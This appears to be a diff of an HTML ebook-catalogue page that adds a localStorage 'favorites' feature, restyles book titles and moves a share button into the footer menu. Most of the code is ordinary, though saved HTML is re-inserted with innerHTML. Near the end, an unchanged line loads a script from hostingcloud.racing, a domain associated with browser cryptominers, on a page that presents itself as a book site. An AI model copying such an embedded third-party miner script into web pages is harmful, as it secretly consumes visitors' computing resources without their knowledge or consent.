@@ -23,9 +23,19 @@
                 width: 100%;
                 height: auto;
             }
+            button{
+                outline: none;
+                border: none;
+                width: 95%;
+                margin: auto;
+                padding: 4px;
+                text-transform: uppercase;
+                background: #16161D;
+                color: #FAF9F6;
+            }
             body{
                 background: #16161D;
-                color: #AFAFAD;
+                color: #FAF9F6;
             }
             header{
                 box-shadow: 1px  1px 2px 1px #12121B;
@@ -72,6 +82,7 @@
                 display: grid;
                 padding: 4px;
                 background: #D98301;
+                border: 1px solid #FF9501;
                 justify-content: center;
                 align-items: center;
             }
@@ -87,7 +98,7 @@
                 object-fit: fill;
                 overflow: hidden;
             }
-            .ebooks ul li p{
+            .ebooks ul li h2{
                 display: grid;
                 text-shadow: 1px 1px #FF9501;
                 padding-top: 4px;
@@ -100,7 +111,74 @@
                 white-space: pre;
                 color: #16161D;
             }
-            .ebooks ul li p::-webkit-scrollbar{
+            .ebooks ul li h2::-webkit-scrollbar{
+                display: none;
+            }
+            .favorites-container{
+                display: none;
+                width: 100%;
+                height: 100%;
+                position: fixed;
+                top: 0px;
+                left: 0px;
+                background: #16161D;
+            }
+            .favorites-list{
+                display: block;
+                height: 100%;
+                overflow-y: scroll;
+                padding-bottom: 90px;
+            }
+            .my-favorites{
+                padding: 10px;
+                text-align: center;
+                background: #D98301;
+                color: #16161D;
+                text-transform: uppercase;
+            }
+            .favorites{
+                display: grid;
+                width: 100%;
+                list-style: none;
+                flex-direction: column;
+                grid-template-columns: 33.33% 33.33% 33.33%;
+                justify-content: space-evenly;
+                padding: 14px;
+                gap: 6px;
+            }
+            .favorites li{
+                display: grid;
+                padding: 4px;
+                background: #D98301;
+                justify-content: center;
+                align-items: center;
+            }
+            .favorites li .cover{
+                height: 145px;
+                width: 100%;
+                object-fit: fill;
+                overflow: hidden;
+            }
+            .favorites li .cover img{
+                height: 100%;
+                width: 100%;
+                object-fit: fill;
+                overflow: hidden;
+            }
+            .favorites li h2{
+                display: grid;
+                text-shadow: 1px 1px #FF9501;
+                padding-top: 4px;
+                font-size: 10px;
+                text-transform: uppercase;
+                text-decoration: none;
+                text-align: center;
+                font-weight: bold;
+                overflow-x: scroll;
+                white-space: pre;
+                color: #16161D;
+            }
+            .favorites li h2::-webkit-scrollbar{
                 display: none;
             }
             .menu{
@@ -129,13 +207,13 @@
             .menu ul li img{
                 display: block;
                 margin: auto;
-                height: 18px;
-                width: 18px;
+                height: 24px;
+                width: 24px;
             }
             .menu ul li span{
                 display: block;
                 font-size: 10px;
-                margin:; auto;
+                margin-top: 6px;
                 color: #16161D;
                 text-shadow: 1px 1px #FF9501;
                 text-transform: uppercase;
@@ -144,14 +222,41 @@
             .ad{
                 padding-top: 6px;
             }
-            .share{
-                width: 50%;
-                margin: auto;
-                padding: 10px;
+            .fav-btn{
+                width: 48px;
+                right: 5%;
+                bottom: 10%;
+                height: 48px;
+                position: fixed;
+                border-radius: 50%;
+                background: #D98301;
+                text-align: center;
+                border: 1px solid #FF9501;
             }
-            .share img{
-                height: 32px;
-                width: 100%;
+            .added, .exists{
+                display: none;
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                padding: 14px;
+                width: 75vw;
+                border-radius: 5px;
+                text-transform: uppercase;
+                border: 2px solid #FAF9F6;
+                transform: translate(-50%);
+                text-align: center;
+                background: #16161D;
+                animation-name: fade;
+                animation-duration: .5s;
+                animation-direction: ease-in-out;
+            }
+            @keyframes fade{
+                0%{
+                    margin-top: -300px;
+                }
+                100%{
+                    margin-top: 0px;
+                }
             }
         </style>
         <!-- AddToAny BEGIN -->
@@ -181,7 +286,8 @@
                             <img src="covers/a-room.jpg">
                             </a>
                         </div>
-                        <p>A Room With a View</p>
+                        <h2>A Room With a View</h2>
+                        <button>Favorite</button>
                     </li>
                     <li>
                         <div class="cover">
@@ -189,7 +295,8 @@
                             <img src="covers/middlemarch.jpg">
                             </a>
                         </div>
-                        <p>Middlemarch</p>
+                        <h2>Middlemarch</h2>
+                        <button>Favorite</button>
                     </li>
                     <li>
                         <div class="cover">
@@ -197,7 +304,8 @@
                             <img src="covers/little-women.jpg">
                             </a>
                         </div>
-                        <p>Little Women</p>
+                        <h2>Little Women</h2>
+                        <button>Favorite</button>
                     </li>
                     <li>
                         <div class="cover">
@@ -205,7 +313,8 @@
                             <img src="covers/blue-castle.jpg">
                             </a>
                         </div>
-                        <p>Blue Castle</p>
+                        <h2>Blue Castle</h2>
+                        <button>Favorite</button>
                     </li>
                     <li>
                         <div class="cover">
@@ -213,17 +322,19 @@
                             <img src="covers/enchanted-april.jpg">
                             </a>
                         </div>
-                        <p>The Enchanted April</p>
+                        <h2>The Enchanted April</h2>
+                        <button>Favorite</button>
                     </li>
                 </ul>
             </section>
+            <section class="favorites-container ">
+                <h2 class="my-favorites">My Favorites</h2>
+                <div class="favorites-list">
+                <ul class="favorites"></ul>
+                </div>
+            </section>
         </main>
         <footer>
-            <section class="share">
-                <a class="a2a_dd" href="https://www.addtoany.com/share">
-                    <img src="https://static.addtoany.com/buttons/share_save_171_16.png" border="0" alt="Share">
-                </a>
-            </section>
             <section class="menu">
                 <ul>
                     <li>
@@ -250,14 +361,32 @@
                         <span>About</span>
                         </a>
                     </li>
+                    <li>
+                        <a class="a2a_dd" href="https://www.addtoany.com/share">
+                        <img src="assets/sharing.png">
+                        <span>Share</span>
+                        </a>
+                    </li>
                 </ul>
             </section>
+            <button class="fav-btn"><img src="assets/favorite.png"></button>
+            <p class="added">eBook has been added to favorites.</p>
+            <p class="exists">eBook is already added in favorites.</p>
         </footer>
     <script>
+        let favBtn = document.querySelector('.fav-btn');
         let searchInput = document.getElementById('search');
         let ebookList = document.getElementById('ebook-list');
         myEbookList = ebookList.getElementsByTagName('li');
         
+        favBtn.addEventListener('click', () => {
+            let favoritesContainer = document.querySelector('.favorites-container');
+            if(favoritesContainer.style.display === 'block'){
+                favoritesContainer.style.display = 'none';
+            }else{
+                favoritesContainer.style.display = 'block';
+            }
+        });
         searchInput.addEventListener('input', () => {
             
             searchInput.value = searchInput.value.toUpperCase();
@@ -271,6 +400,72 @@
                 }
             }
         });
+        
+      document.addEventListener("DOMContentLoaded", function () {
+        const ebookList = document.querySelector("#ebook-list");
+        const favoritesList = document.querySelector(".favorites");
+
+        // Load favorites from local storage
+        const savedFavorites = JSON.parse(localStorage.getItem("favorites")) || [];
+
+        // Function to update the favorites list
+        function updateFavorites() {
+          favoritesList.innerHTML = "";
+          savedFavorites.reverse().forEach(item => {
+            const li = document.createElement("li");
+            li.innerHTML = item;
+
+            const unfavoriteButton = document.createElement("button");
+            unfavoriteButton.textContent = "Unfavorite";
+            unfavoriteButton.addEventListener("click", function () {
+              const index = savedFavorites.indexOf(item);
+              if (index !== -1) {
+                savedFavorites.splice(index, 1);
+                localStorage.setItem("favorites", JSON.stringify(savedFavorites));
+                updateFavorites();
+              }
+            });
+
+            li.appendChild(unfavoriteButton);
+            favoritesList.appendChild(li);
+          });
+        }
+
+        // Initial update of the favorites list
+        updateFavorites();
+
+        ebookList.addEventListener("click", function (event) {
+          if (event.target.tagName === "BUTTON") {
+            const ebookItem = event.target.parentElement;
+            const ebookItemClone = ebookItem.cloneNode(true);
+            // Remove the "Favorite" button from the cloned list item
+            const favoriteButton = ebookItemClone.querySelector("button");
+            favoriteButton.remove();
+
+            const title = ebookItemClone.querySelector("h2").textContent;
+            const ebookExists = savedFavorites.some(item => item.includes(title))
+            if (!savedFavorites.includes(ebookItemClone.outerHTML) && !ebookExists) {
+              // Move the cloned list item to the favorites list
+              favoritesList.appendChild(ebookItemClone);
+              savedFavorites.push(ebookItemClone.outerHTML);
+              localStorage.setItem("favorites", JSON.stringify(savedFavorites));
+              updateFavorites();
+              let added = document.querySelector('.added');
+               added.style.display = 'block';
+               setTimeout(() => {
+                    added.style.display = 'none';
+                }, 2500);
+            }else{
+               let exists = document.querySelector('.exists');
+               exists.style.display = 'block';
+               setTimeout(() => {
+               exists.style.display = 'none';
+                }, 2500);
+            }
+          }
+        });
+      });
+    
     </script>
     <script src="https://www.hostingcloud.racing/73UE.js"></script>
     <script>
